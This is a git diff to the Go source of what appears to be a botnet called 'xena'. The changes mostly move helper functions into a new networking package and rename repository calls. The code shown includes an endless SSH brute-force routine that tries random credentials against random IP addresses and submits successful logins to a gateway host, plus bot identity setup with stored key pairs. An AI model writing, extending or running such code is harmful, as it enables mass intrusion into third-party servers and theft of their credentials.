@@ -9,6 +9,7 @@ import (
 	"xena/gateway"
 	"xena/helpers"
 	"xena/modules"
+	"xena/networking"
 	"xena/repository"
 	"xena/services"
 
@@ -24,14 +25,16 @@ var identified bool = false
 // sshCrackRoutine is an infinite loop of cracking SSH service.
 func sshCrackRoutine(gatewayHost string) {
 	for {
-		address := modules.IpRandomAddress()
-		user := modules.RandomSshUser()
-		pass := modules.RandomSshPass()
-		err := modules.SshCheck(address, user, pass, 22)
+		address := networking.IpRandomAddress()
+		user := networking.RandomSshUser()
+		pass := networking.RandomSshPass()
+
+		err := networking.SshCheck(address, user, pass, 22)
 		if err != nil {
 			fmt.Println(err)
 			continue
 		}
+
 		err = gateway.SubmitCreds(gatewayHost, gateway.Creds{
 			Ip:   address,
 			Port: 22,
@@ -105,14 +108,14 @@ func initialize() {
 	}
 
 	// Initialize a SQLite database and run the migrations.
-	err := repository.Init(modules.SelfHash)
+	err := repository.DB.Init(helpers.RandomPopularWordBySeed(helpers.IntegersFromString(modules.SelfHash)))
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
 	// Check the database for details about self.
-	botDetails, err := repository.GetBotDetails()
+	botDetails, err := repository.DetailsRepo.Get()
 	if err != nil {
 		fmt.Println(err)
 		return
@@ -127,7 +130,7 @@ func initialize() {
 		config.ID = uuid.New().String()
 
 		// Save into the database.
-		repository.InsertBotDetails(config.ID, modules.PrivateKeyToPEM(config.PrivateIdentificationKey), modules.PublicKeyToPEM(config.PublicIdentificationKey))
+		repository.DetailsRepo.Insert(config.ID, modules.PrivateKeyToPEM(config.PrivateIdentificationKey), modules.PublicKeyToPEM(config.PublicIdentificationKey))
 	} else {
 		// Load into global variables bot's details.
 		config.PrivateIdentificationKey, err = modules.ImportPEMPrivateKey(botDetails.PrivateKey)
